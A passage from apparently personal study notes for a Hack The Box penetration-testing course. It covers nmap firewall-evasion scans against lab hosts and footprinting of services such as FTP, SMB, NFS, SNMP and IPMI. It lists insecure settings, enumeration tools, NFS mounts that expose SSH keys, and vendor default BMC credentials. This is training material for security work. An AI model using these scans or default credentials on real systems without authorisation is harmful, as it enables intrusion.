</span></span><span class=line><span class=cl>Aggressive OS guesses: Linux 2.6.32 <span class=o>(</span>96%<span class=o>)</span>, Linux 3.2 - 4.9 <span class=o>(</span>96%<span class=o>)</span>, Linux 2.6.32 - 3.10 <span class=o>(</span>96%<span class=o>)</span>, Linux 3.4 - 3.10 <span class=o>(</span>95%<span class=o>)</span>, Linux 3.1 <span class=o>(</span>95%<span class=o>)</span>, Linux 3.2 <span class=o>(</span>95%<span class=o>)</span>, AXIS 210A or <span class=m>211</span> Network Camera <span class=o>(</span>Linux 2.6.17<span class=o>)</span> <span class=o>(</span>94%<span class=o>)</span>, Synology DiskStation Manager 5.2-5644 <span class=o>(</span>94%<span class=o>)</span>, Linux 2.6.32 - 2.6.35 <span class=o>(</span>94%<span class=o>)</span>, Linux 2.6.32 - 3.5 <span class=o>(</span>94%<span class=o>)</span>
</span></span><span class=line><span class=cl>No exact OS matches <span class=k>for</span> host <span class=o>(</span><span class=nb>test</span> conditions non-ideal<span class=o>)</span>.
</span></span><span class=line><span class=cl>Network Distance: <span class=m>1</span> hop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 4.11 seconds
</span></span></code></pre></div><table><thead><tr><th>Scanning Options</th><th>Description</th></tr></thead><tbody><tr><td><code>10.129.2.28</code></td><td>Scans the specified target.</td></tr><tr><td><code>-n</code></td><td>Disables DNS resolution.</td></tr><tr><td><code>-Pn</code></td><td>Disables ICMP Echo requests.</td></tr><tr><td><code>-p 445</code></td><td>Scans only the specified ports.</td></tr><tr><td><code>-O</code></td><td>Performs operation system detection scan.</td></tr><tr><td><code>-S</code></td><td>Scans the target by using different source IP address.</td></tr><tr><td><code>10.129.2.200</code></td><td>Specifies the source IP address.</td></tr><tr><td><code>-e tun0</code></td><td>Sends all requests through the specified interface.</td></tr></tbody></table><p><strong>Specified Source Port</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port <span class=m>53</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>SENT <span class=o>(</span>0.0482s<span class=o>)</span> TCP 10.10.14.2:53 &gt; 10.129.2.28:50000 S <span class=nv>ttl</span><span class=o>=</span><span class=m>58</span> <span class=nv>id</span><span class=o>=</span><span class=m>27470</span> <span class=nv>iplen</span><span class=o>=</span><span class=m>44</span>  <span class=nv>seq</span><span class=o>=</span><span class=m>4003923435</span> <span class=nv>win</span><span class=o>=</span><span class=m>1024</span> &lt;mss 1460&gt;
</span></span><span class=line><span class=cl>RCVD <span class=o>(</span>0.0608s<span class=o>)</span> TCP 10.129.2.28:50000 &gt; 10.10.14.2:53 SA <span class=nv>ttl</span><span class=o>=</span><span class=m>64</span> <span class=nv>id</span><span class=o>=</span><span class=m>0</span> <span class=nv>iplen</span><span class=o>=</span><span class=m>44</span>  <span class=nv>seq</span><span class=o>=</span><span class=m>540635485</span> <span class=nv>win</span><span class=o>=</span><span class=m>64240</span> &lt;mss 1460&gt;
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.2.28
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.013s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT      STATE SERVICE
</span></span><span class=line><span class=cl>50000/tcp open  ibm-db2
</span></span><span class=line><span class=cl>MAC Address: DE:AD:00:00:BE:EF <span class=o>(</span>Intel Corporate<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 0.08 seconds
</span></span></code></pre></div><table><thead><tr><th>Scanning Options</th><th>Description</th></tr></thead><tbody><tr><td><code>10.129.2.28</code></td><td>Scans the specified target.</td></tr><tr><td><code>-p 50000</code></td><td>Scans only the specified ports.</td></tr><tr><td><code>-sS</code></td><td>Performs SYN scan on specified ports.</td></tr><tr><td><code>-Pn</code></td><td>Disables ICMP Echo requests.</td></tr><tr><td><code>-n</code></td><td>Disables DNS resolution.</td></tr><tr><td><code>--disable-arp-ping</code></td><td>Disables ARP ping.</td></tr><tr><td><code>--packet-trace</code></td><td>Shows all packets sent and received.</td></tr><tr><td><code>--source-port 53</code></td><td>Performs the scans from specified source port.</td></tr></tbody></table><h3 id=complete-2>Complete<a hidden class=anchor aria-hidden=true href=#complete-2>#</a></h3><p><a href=https://academy.hackthebox.com/achievement/713396/19 title="Link Of Completion" target=_blank rel="nofollow noopener">Link Of Completion</a></p><p> </p><hr><p> </p><h2 id=footprinting>Footprinting<a hidden class=anchor aria-hidden=true href=#footprinting>#</a></h2><h3 id=enumeration-principles>Enumeration Principles<a hidden class=anchor aria-hidden=true href=#enumeration-principles>#</a></h3><table><thead><tr><th>No.</th><th>Principle</th></tr></thead><tbody><tr><td>1.</td><td>There is more than meets the eye. Consider all points of view.</td></tr><tr><td>2.</td><td>Distinguish between what we see and what we do not see.</td></tr><tr><td>3.</td><td>There are always ways to gain more information. Understand the target.</td></tr></tbody></table><p><strong>Enumermation Questions</strong></p><ul><li>What can we see?</li><li>What reasons can we have for seeing it?</li><li>What image does what we see create for us?</li><li>What do we gain from it?</li><li>How can we use it?</li><li>What can we not see?</li><li>What reasons can there be that we do not see?</li><li>What image results for us from what we do not see?</li></ul><h3 id=enumeration-methodology>Enumeration Methodology<a hidden class=anchor aria-hidden=true href=#enumeration-methodology>#</a></h3><p><figure class=image-caption><img alt=methods srcset="/posts/htb/pentester/images/enum-method_hu133a66f9d3b28f320f41c7af1fcbfd41_349128_480x0_resize_q75_h2_box_3.webp 480w,
/posts/htb/pentester/images/enum-method_hu133a66f9d3b28f320f41c7af1fcbfd41_349128_768x0_resize_q75_h2_box_3.webp 768w,
/posts/htb/pentester/images/enum-method_hu133a66f9d3b28f320f41c7af1fcbfd41_349128_1024x0_resize_q75_h2_box_3.webp 1024w" sizes=100vw src=images/enum-method.png width=768 height=432 loading=lazy><figcaption></figcaption></figure></p><table><thead><tr><th>Layer</th><th>Description</th><th>Information Categories</th></tr></thead><tbody><tr><td>1. Internet Presence</td><td>Identification of internet presence and externally accessible infrastructure.</td><td>Domains, Subdomains, vHosts, ASN, Netblocks, IP Addresses, Cloud Instances, Security Measures</td></tr><tr><td>2. Gateway</td><td>Identify the possible security measures to protect the company&rsquo;s external and internal infrastructure.</td><td>Firewalls, DMZ, IPS/IDS, EDR, Proxies, NAC, Network Segmentation, VPN, Cloudflare</td></tr><tr><td>3. Accessible Services</td><td>Identify accessible interfaces and services that are hosted externally or internally.</td><td>Service Type, Functionality, Configuration, Port, Version, Interface</td></tr><tr><td>4. Processes</td><td>Identify the internal processes, sources, and destinations associated with the services.</td><td>PID, Processed Data, Tasks, Source, Destination</td></tr><tr><td>5. Privileges</td><td>Identification of the internal permissions and privileges to the accessible services.</td><td>Groups, Users, Permissions, Restrictions, Environment</td></tr><tr><td>6. OS Setup</td><td>Identification of the internal components and systems setup.</td><td>OS Type, Patch Level, Network config, OS Environment, Configuration files, sensitive private files</td></tr></tbody></table><h3 id=ftp>FTP<a hidden class=anchor aria-hidden=true href=#ftp>#</a></h3><p>FTP, or File Transfer Protocol, is a standard network protocol used for the transfer of files between a client and server on a computer network. The FTP runs within the application layer of the TCP/IP protocol stack. It&rsquo;s built on a client-server model architecture and uses separate control and data connections between the client and the server.</p><p><strong>Ports</strong></p><ul><li>20 (TCP): Data transfer port (Active Mode).</li><li>21 (TCP): Command/control port (used for connecting to the FTP server).</li></ul><p><strong>vsFTPd</strong></p><table><thead><tr><th>Setting</th><th>Description</th></tr></thead><tbody><tr><td><code>listen=NO</code></td><td>Run from inetd or as a standalone daemon?</td></tr><tr><td><code>listen_ipv6=YES</code></td><td>Listen on IPv6 ?</td></tr><tr><td><code>anonymous_enable=NO</code></td><td>Enable Anonymous access?</td></tr><tr><td><code>local_enable=YES</code></td><td>Allow local users to login?</td></tr><tr><td><code>dirmessage_enable=YES</code></td><td>Display active directory messages when users go into certain directories?</td></tr><tr><td><code>use_localtime=YES</code></td><td>Use local time?</td></tr><tr><td><code>xferlog_enable=YES</code></td><td>Activate logging of uploads/downloads?</td></tr><tr><td><code>connect_from_port_20=YES</code></td><td>Connect from port 20?</td></tr><tr><td><code>secure_chroot_dir=/var/run/vsftpd/empty</code></td><td>Name of an empty directory</td></tr><tr><td><code>pam_service_name=vsftpd</code></td><td>This string is the name of the PAM service vsftpd will use.</td></tr><tr><td><code>rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem</code></td><td>The last three options specify the location of the RSA certificate to use for SSL encrypted connections.</td></tr><tr><td><code>rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key</code></td><td></td></tr><tr><td><code>ssl_enable=NO</code></td><td></td></tr></tbody></table><p><strong>Dangerous Settings</strong></p><table><thead><tr><th>Setting</th><th>Description</th></tr></thead><tbody><tr><td><code>anonymous_enable=YES</code></td><td>Allowing anonymous login?</td></tr><tr><td><code>anon_upload_enable=YES</code></td><td>Allowing anonymous to upload files?</td></tr><tr><td><code>anon_mkdir_write_enable=YES</code></td><td>Allowing anonymous to create new directories?</td></tr><tr><td><code>no_anon_password=YES</code></td><td>Do not ask anonymous for password?</td></tr><tr><td><code>anon_root=/home/username/ftp</code></td><td>Directory for anonymous.</td></tr><tr><td><code>write_enable=YES</code></td><td>Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?</td></tr></tbody></table><h3 id=smb>SMB<a hidden class=anchor aria-hidden=true href=#smb>#</a></h3><p>SMB, or Server Message Block, is a network file sharing protocol that allows applications on a computer to read and write to files and request services from server programs in a computer network. SMB is used to enable access to files, printers, and other shared resources on a network.</p><p><strong>Ports</strong></p><ul><li>137 (UDP): Used for NetBIOS name service.</li><li>138 (UDP): Used for NetBIOS datagram service.</li><li>139 (TCP/UDP): Used for SMB over NetBIOS (a legacy protocol).</li><li>445 (TCP/UDP): Used for SMB over TCP/IP (CIFS only uses port 445)</li></ul><p><strong>smb.conf</strong></p><table><thead><tr><th>Setting</th><th>Description</th></tr></thead><tbody><tr><td><code>[sharename]</code></td><td>The name of the network share.</td></tr><tr><td><code>workgroup = WORKGROUP/DOMAIN</code></td><td>Workgroup that will appear when clients query.</td></tr><tr><td><code>path = /path/here/</code></td><td>The directory to which user is to be given access.</td></tr><tr><td><code>server string = STRING</code></td><td>The string that will show up when a connection is initiated.</td></tr><tr><td><code>unix password sync = yes</code></td><td>Synchronize the UNIX password with the SMB password?</td></tr><tr><td><code>usershare allow guests = yes</code></td><td>Allow non-authenticated users to access defined share?</td></tr><tr><td><code>map to guest = bad user</code></td><td>What to do when a user login request doesn&rsquo;t match a valid UNIX user?</td></tr><tr><td><code>browseable = yes</code></td><td>Should this share be shown in the list of available shares?</td></tr><tr><td><code>guest ok = yes</code></td><td>Allow connecting to the service without using a password?</td></tr><tr><td><code>read only = yes</code></td><td>Allow users to read files only?</td></tr><tr><td><code>create mask = 0700</code></td><td>What permissions need to be set for newly created files?</td></tr></tbody></table><p><strong>Dangerous Settings</strong></p><table><thead><tr><th>Setting</th><th>Description</th></tr></thead><tbody><tr><td><code>browseable = yes</code></td><td>Allow listing available shares in the current share?</td></tr><tr><td><code>read only = no</code></td><td>Forbid the creation and modification of files?</td></tr><tr><td><code>writable = yes</code></td><td>Allow users to create and modify files?</td></tr><tr><td><code>guest ok = yes</code></td><td>Allow connecting to the service without using a password?</td></tr><tr><td><code>enable privileges = yes</code></td><td>Honor privileges assigned to specific SID?</td></tr><tr><td><code>create mask = 0777</code></td><td>What permissions must be assigned to the newly created files?</td></tr><tr><td><code>directory mask = 0777</code></td><td>What permissions must be assigned to the newly created directories?</td></tr><tr><td><code>logon script = script.sh</code></td><td>What script needs to be executed on the user&rsquo;s login?</td></tr><tr><td><code>magic script = script.sh</code></td><td>Which script should be executed when the script gets closed?</td></tr><tr><td><code>magic output = script.out</code></td><td>Where the output of the magic script needs to be stored?</td></tr></tbody></table><p><strong>SMB Tools</strong></p><ul><li>smbclient</li><li>RPCclient</li><li>Samrdump.py (Impacket)</li><li>SMBmap</li><li>CrackMapExec</li><li>Enum4Linux-ng</li></ul><h3 id=nfs>NFS<a hidden class=anchor aria-hidden=true href=#nfs>#</a></h3><p>Network File System (NFS) is a network file system developed by Sun Microsystems and has the same purpose as SMB. Its purpose is to access file systems over a network as if they were local. However, it uses an entirely different protocol. NFS is used between Linux and Unix systems. This means that NFS clients cannot communicate directly with SMB servers. NFS is an Internet standard that governs the procedures in a distributed file system.</p><table><thead><tr><th>Version</th><th>Features</th></tr></thead><tbody><tr><td>NFSv2</td><td>It is older but is supported by many systems and was initially operated entirely over UDP.</td></tr><tr><td>NFSv3</td><td>It has more features, including variable file size and better error reporting, but is not fully compatible with NFSv2 clients.</td></tr><tr><td>NFSv4</td><td>It includes Kerberos, works through firewalls and on the Internet, no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security. It is also the first version to have a stateful protocol.</td></tr></tbody></table><p><strong>Ports</strong></p><ul><li>111 (TCP): RPCbind/Portmapper</li><li>2049 (TCP/UDP): This is the primary port used by NFS servers for client-server communication.</li></ul><p><strong>/etc/exports</strong></p><table><thead><tr><th>Option</th><th>Description</th></tr></thead><tbody><tr><td><code>rw</code></td><td>Read and write permissions.</td></tr><tr><td><code>ro</code></td><td>Read only permissions.</td></tr><tr><td><code>sync</code></td><td>Synchronous data transfer. (A bit slower)</td></tr><tr><td><code>async</code></td><td>Asynchronous data transfer. (A bit faster)</td></tr><tr><td><code>secure</code></td><td>Ports above 1024 will not be used.</td></tr><tr><td><code>insecure</code></td><td>Ports above 1024 will be used.</td></tr><tr><td><code>no_subtree_check</code></td><td>This option disables the checking of subdirectory trees.</td></tr><tr><td><code>root_squash</code></td><td>Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents root from accessing files on an NFS mount.</td></tr></tbody></table><p><strong>Dangerous Settings</strong></p><table><thead><tr><th>Option</th><th>Description</th></tr></thead><tbody><tr><td><code>rw</code></td><td>Read and write permissions.</td></tr><tr><td><code>insecure</code></td><td>Ports above 1024 will be used.</td></tr><tr><td><code>nohide</code></td><td>If another file system was mounted below an exported directory, this directory is exported by its own exports entry.</td></tr><tr><td><code>no_root_squash</code></td><td>All files created by root are kept with the UID/GID 0.</td></tr></tbody></table><p><strong>Show Mount</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ showmount -e 10.129.14.128
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Export list <span class=k>for</span> 10.129.14.128:
</span></span><span class=line><span class=cl>/mnt/nfs 10.129.14.0/24
</span></span></code></pre></div><p><strong>Mount NFS Share</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ mkdir target-NFS
</span></span><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
</span></span><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ <span class=nb>cd</span> target-NFS
</span></span><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ tree .
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>└── mnt
</span></span><span class=line><span class=cl>    └── nfs
</span></span><span class=line><span class=cl>        ├── id_rsa
</span></span><span class=line><span class=cl>        ├── id_rsa.pub
</span></span><span class=line><span class=cl>        └── nfs.share
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>2</span> directories, <span class=m>3</span> files
</span></span></code></pre></div><p><strong>Unmounting</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo umount ./target-NFS
</span></span></code></pre></div><h3 id=dns>DNS<a hidden class=anchor aria-hidden=true href=#dns>#</a></h3><p>DNS, or Domain Name System, is a hierarchical and decentralized naming system for computers, services, or other resources connected to the Internet or a private network. It translates more readily memorized domain names to the numerical IP addresses needed for locating and identifying computer services and devices with the underlying network protocols.</p><p><strong>Ports</strong></p><ul><li>53 (TCP/UDP): The primary port used by DNS servers.</li></ul><table><thead><tr><th>Server Type</th><th>Description</th></tr></thead><tbody><tr><td>DNS Root Server</td><td>The root servers of the DNS are responsible for the top-level domains (TLD). As the last instance, they are only requested if the name server does not respond. Thus, a root server is a central interface between users and content on the Internet, as it links domain and IP address. The Internet Corporation for Assigned Names and Numbers (ICANN) coordinates the work of the root name servers. There are 13 such root servers around the globe.</td></tr><tr><td>Authoritative Nameserver</td><td>Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client&rsquo;s query, the root name server takes over at that point.</td></tr><tr><td>Non-authoritative Nameserver</td><td>Non-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying.</td></tr><tr><td>Caching DNS Server</td><td>Caching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage.</td></tr><tr><td>Forwarding Server</td><td>Forwarding servers perform only one function: they forward DNS queries to another DNS server.</td></tr><tr><td>Resolver</td><td>Resolvers are not authoritative DNS servers but perform name resolution locally in the computer or router.</td></tr></tbody></table><p><figure class=image-caption><img alt=dns srcset="/posts/htb/pentester/images/dns_hud823db5d3034c62488cbb954cc83bab0_58599_480x0_resize_q75_h2_box_3.webp 480w,
/posts/htb/pentester/images/dns_hud823db5d3034c62488cbb954cc83bab0_58599_768x0_resize_q75_h2_box_3.webp 768w,
/posts/htb/pentester/images/dns_hud823db5d3034c62488cbb954cc83bab0_58599_1024x0_resize_q75_h2_box_3.webp 1024w" sizes=100vw src=images/dns.png width=768 height=466 loading=lazy><figcaption></figcaption></figure></p><table><thead><tr><th>DNS Record</th><th>Description</th></tr></thead><tbody><tr><td>A</td><td>Returns an IPv4 address of the requested domain as a result.</td></tr><tr><td>AAAA</td><td>Returns an IPv6 address of the requested domain.</td></tr><tr><td>MX</td><td>Returns the responsible mail servers as a result.</td></tr><tr><td>NS</td><td>Returns the DNS servers (nameservers) of the domain.</td></tr><tr><td>TXT</td><td>This record can contain various information. The all-rounder can be used, e.g., to validate the Google Search Console or validate SSL certificates. In addition, SPF and DMARC entries are set to validate mail traffic and protect it from spam.</td></tr><tr><td>CNAME</td><td>This record serves as an alias. If the domain <a href=https://www.hackthebox.eu title=www.hackthebox.eu target=_blank rel="nofollow noopener">www.hackthebox.eu</a> should point to the same IP, and we create an A record for one and a CNAME record for the other.</td></tr><tr><td>PTR</td><td>The PTR record works the other way around (reverse lookup). It converts IP addresses into valid domain names.</td></tr><tr><td>SOA</td><td>Provides information about the corresponding DNS zone and email address of the administrative contact.</td></tr></tbody></table><p><strong>DNS Tools</strong></p><ul><li>dnsenum</li><li>dig</li></ul><h4 id=smtp>SMTP<a hidden class=anchor aria-hidden=true href=#smtp>#</a></h4><p>The Simple Mail Transfer Protocol (SMTP) is a protocol for sending emails in an IP network. It can be used between an email client and an outgoing mail server or between two SMTP servers. SMTP is often combined with the IMAP or POP3 protocols, which can fetch emails and send emails. In principle, it is a client-server-based protocol, although SMTP can be used between a client and a server and between two SMTP servers.</p><p><strong>Ports</strong></p><ul><li>25 (TCP): This is the default SMTP non-encrypted port. It&rsquo;s widely used for SMTP relaying and communication between mail servers.</li><li>587 (TCP): Recommended for SMTP submission, especially for clients sending emails to a server. It supports STARTTLS, allowing encryption.</li><li>465 (TCP): Originally intended for SMTPS (SMTP over SSL), but was never standardized. Some systems still use it for SMTP with SSL/TLS encryption from the start of the connection.</li></ul><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>AUTH PLAIN</code></td><td>AUTH is a service extension used to authenticate the client.</td></tr><tr><td><code>HELO</code></td><td>The client logs in with its computer name and thus starts the session.</td></tr><tr><td><code>MAIL FROM</code></td><td>The client names the email sender.</td></tr><tr><td><code>RCPT TO</code></td><td>The client names the email recipient.</td></tr><tr><td><code>DATA</code></td><td>The client initiates the transmission of the email.</td></tr><tr><td><code>RSET</code></td><td>The client aborts the initiated transmission but keeps the connection between client and server.</td></tr><tr><td><code>VRFY</code></td><td>The client checks if a mailbox is available for message transfer.</td></tr><tr><td><code>EXPN</code></td><td>The client also checks if a mailbox is available for messaging with this command.</td></tr><tr><td><code>NOOP</code></td><td>The client requests a response from the server to prevent disconnection due to time-out.</td></tr><tr><td><code>QUIT</code></td><td>The client terminates the session.</td></tr></tbody></table><p><strong>SMTP Tools</strong></p><ul><li>smtp-user-enum</li><li>telnet</li></ul><h3 id=imap--pop3>IMAP / POP3<a hidden class=anchor aria-hidden=true href=#imap--pop3>#</a></h3><p>With the help of the Internet Message Access Protocol (IMAP), access to emails from a mail server is possible. Unlike the Post Office Protocol (POP3), IMAP allows online management of emails directly on the server and supports folder structures. Thus, it is a network protocol for the online management of emails on a remote server. The protocol is client-server-based and allows synchronization of a local email client with the mailbox on the server, providing a kind of network file system for emails, allowing problem-free synchronization across several independent clients. POP3, on the other hand, does not have the same functionality as IMAP, and it only provides listing, retrieving, and deleting emails as functions at the email server. Therefore, protocols such as IMAP must be used for additional functionalities such as hierarchical mailboxes directly at the mail server, access to multiple mailboxes during a session, and preselection of emails.</p><p><strong>Ports</strong></p><ul><li>110 (TCP): POP3 (Standard) Used for retrieving emails with the Post Office Protocol version 3 (POP3) in a non-encrypted form.</li><li>143 (TCP): IMAP (Standard) Utilized for accessing emails using the Internet Message Access Protocol (IMAP) without encryption.</li><li>993 (TCP): IMAP over SSL/TLS (Secure) For accessing emails via IMAP securely using SSL/TLS encryption.</li><li>995 (TCP): POP3 over SSL/TLS (Secure) Used for secure email retrieval using POP3 with SSL/TLS encryption.</li></ul><p><strong>IMAP Tools</strong></p><ul><li>evolution</li><li>curl</li><li>openssl</li></ul><h3 id=snmp>SNMP<a hidden class=anchor aria-hidden=true href=#snmp>#</a></h3><p>Simple Network Management Protocol (SNMP) is a widely used protocol for managing devices on IP networks. It&rsquo;s used for collecting information from, and configuring, network devices such as servers, printers, switches, routers, and more.</p><p><strong>Ports</strong></p><ul><li>161 (UDP): The main port used by SNMP for sending and receiving requests.</li><li>162 (UDP): This port is used for SNMP traps. Traps are alerts or notifications sent from an SNMP-enabled device to a management station.</li></ul><p><strong>MIB</strong></p><p>To ensure that SNMP access works across manufacturers and with different client-server combinations, the Management Information Base (MIB) was created. MIB is an independent format for storing device information. A MIB is a text file in which all queryable SNMP objects of a device are listed in a standardized tree hierarchy. It contains at least one Object Identifier (OID), which, in addition to the necessary unique address and a name, also provides information about the type, access rights, and a description of the respective object. MIB files are written in the Abstract Syntax Notation One (ASN.1) based ASCII text format. The MIBs do not contain data, but they explain where to find which information and what it looks like, which returns values for the specific OID, or which data type is used.</p><p><strong>OID</strong></p><p>An OID represents a node in a hierarchical namespace. A sequence of numbers uniquely identifies each node, allowing the node&rsquo;s position in the tree to be determined. The longer the chain, the more specific the information. Many nodes in the OID tree contain nothing except references to those below them. The OIDs consist of integers and are usually concatenated by dot notation.</p><p><strong>Dangerous Settings</strong></p><table><thead><tr><th>Settings</th><th>Description</th></tr></thead><tbody><tr><td>rwuser noauth</td><td>Provides access to the full OID tree without authentication.</td></tr><tr><td>rwcommunity</td><td>Provides access to the full OID tree regardless of where the requests were sent from.</td></tr><tr><td>rwcommunity6</td><td>Same access as with rwcommunity with the difference of using IPv6.</td></tr></tbody></table><p><strong>SNMP Tools</strong></p><ul><li>SNMPwalk</li><li>OneSixtyOne</li><li>Braa</li></ul><h3 id=mysql>MySQL<a hidden class=anchor aria-hidden=true href=#mysql>#</a></h3><p>MySQL is a popular open-source relational database management system (RDBMS). It&rsquo;s widely used for a variety of applications, from small personal projects to large enterprise systems.</p><p><strong>Ports</strong></p><ul><li>3306 (TCP): This is the default port used by MySQL. When a client connects to a MySQL server, it typically uses this port.</li></ul><p><strong>Dangerous Settings</strong></p><table><thead><tr><th>Settings</th><th>Description</th></tr></thead><tbody><tr><td>user</td><td>Sets which user the MySQL service will run as.</td></tr><tr><td>password</td><td>Sets the password for the MySQL user.</td></tr><tr><td>admin_address</td><td>The IP address on which to listen for TCP/IP connections on the administrative network interface.</td></tr><tr><td>debug</td><td>This variable indicates the current debugging settings.</td></tr><tr><td>sql_warnings</td><td>This variable controls whether single-row INSERT statements produce an information string if warnings occur.</td></tr><tr><td>secure_file_priv</td><td>This variable is used to limit the effect of data import and export operations.</td></tr></tbody></table><p><strong>Key Commands</strong></p><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>mysql -u &lt;user> -p&lt;password> -h &lt;IP address></code></td><td>Connect to the MySQL server. There should not be a space between the &lsquo;-p&rsquo; flag, and the password.</td></tr><tr><td><code>show databases;</code></td><td>Show all databases.</td></tr><tr><td><code>use &lt;database>;</code></td><td>Select one of the existing databases.</td></tr><tr><td><code>show tables;</code></td><td>Show all available tables in the selected database.</td></tr><tr><td><code>show columns from &lt;table>;</code></td><td>Show all columns in the selected database.</td></tr><tr><td><code>select * from &lt;table>;</code></td><td>Show everything in the desired table.</td></tr><tr><td><code>select * from &lt;table> where &lt;column> = "&lt;string>";</code></td><td>Search for needed string in the desired table.</td></tr></tbody></table><h3 id=mssql>MSSQL<a hidden class=anchor aria-hidden=true href=#mssql>#</a></h3><p>Microsoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. It&rsquo;s designed to store, retrieve, and manage data for various software applications.</p><p><strong>Ports</strong></p><ul><li>1433 (TCP): Default port for the SQL Server database engine.</li><li>1434 (TCP): Used for SQL Server named instances and the SQL Server Browser Service.</li></ul><p><strong>Default Databases</strong></p><table><thead><tr><th>Default System Database</th><th>Description</th></tr></thead><tbody><tr><td>master</td><td>Tracks all system information for an SQL server instance</td></tr><tr><td>model</td><td>Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database</td></tr><tr><td>msdb</td><td>The SQL Server Agent uses this database to schedule jobs & alerts</td></tr><tr><td>tempdb</td><td>Stores temporary objects</td></tr><tr><td>resource</td><td>Read-only database containing system objects included with SQL server</td></tr></tbody></table><p><strong>Tools</strong></p><ul><li>nmap</li><li>msfconsole (scanner/mssql/mssql_ping)</li><li>mssqlclient.py</li><li>dbeaver</li></ul><h3 id=ipmi>IPMI<a hidden class=anchor aria-hidden=true href=#ipmi>#</a></h3><p>Intelligent Platform Management Interface (IPMI) is a standardized computer system interface used for out-of-band management of computer systems and monitoring of their operation. It allows system administrators to manage systems remotely and monitor system health, even in the absence of an operating system or when the system is powered off. Systems that use the IPMI protocol are called Baseboard Management Controllers (BMCs). Gaining access to a BMC is nearly equivalent to physical access to a system.</p><p><strong>Ports</strong></p><ul><li>623 (UDP/TCP): The default port used for IPMI. It&rsquo;s used for remote management and monitoring.</li></ul><p><strong>BMC Default Credentials</strong>
Product Username Password</p><table><thead><tr><th>Product</th><th>Username</th><th>Password</th></tr></thead><tbody><tr><td>Dell iDRAC</td><td><code>root</code></td><td><code>calvin</code></td></tr><tr><td>HP iLO</td><td><code>Administrator</code></td><td>randomized 8-character string consisting of numbers and uppercase letters</td></tr><tr><td>Supermicro IPMI</td><td><code>ADMIN</code></td><td><code>ADMIN</code></td></tr></tbody></table><p><strong>Tools</strong></p><ul><li>nmap</li><li>msfconsole (scanner/ipmi/ipmi_version, scanner/ipmi/ipmi_dumphashes)</li></ul><h3 id=ssh>SSH<a hidden class=anchor aria-hidden=true href=#ssh>#</a></h3><p>Secure Shell (SSH) is a cryptographic network protocol used for secure data communication, remote command-line login, remote command execution, and other secure network services between two networked computers.</p><p><strong>Ports</strong></p><ul><li>22 (TCP): The default port used for SSH connections.</li></ul><p><strong>Dangerous Settings</strong></p><table><thead><tr><th>Setting</th><th>Description</th></tr></thead><tbody><tr><td>PasswordAuthentication yes</td><td>Allows password-based authentication.</td></tr><tr><td>PermitEmptyPasswords yes</td><td>Allows the use of empty passwords.</td></tr><tr><td>PermitRootLogin yes</td><td>Allows to log in as the root user.</td></tr><tr><td>Protocol 1</td><td>Uses an outdated version of encryption.</td></tr><tr><td>X11Forwarding yes</td><td>Allows X11 forwarding for GUI applications.</td></tr><tr><td>AllowTcpForwarding yes</td><td>Allows forwarding of TCP ports.</td></tr><tr><td>PermitTunnel</td><td>Allows tunneling.</td></tr><tr><td>DebianBanner yes</td><td>Displays a specific banner when logging in.</td></tr></tbody></table><p><strong>Tools</strong></p><ul><li>ssh-audit.py</li></ul><h3 id=rsync>Rsync<a hidden class=anchor aria-hidden=true href=#rsync>#</a></h3><p>Rsync is a utility for efficiently transferring and synchronizing files across computer systems, using a data streaming technique to minimize data transfer.</p><p><strong>Ports</strong></p><ul><li>873 (TCP/UDP): The default port used for Rsync services.</li></ul><p><strong>Tools</strong></p><ul><li>nmap</li><li>nc</li><li>rsync</li></ul><h3 id=r-services>R-Services<a hidden class=anchor aria-hidden=true href=#r-services>#</a></h3><p>R-Services refers to a suite of services for remote command execution, typically used in UNIX and Linux environments. These include Rlogin, Rsh, and 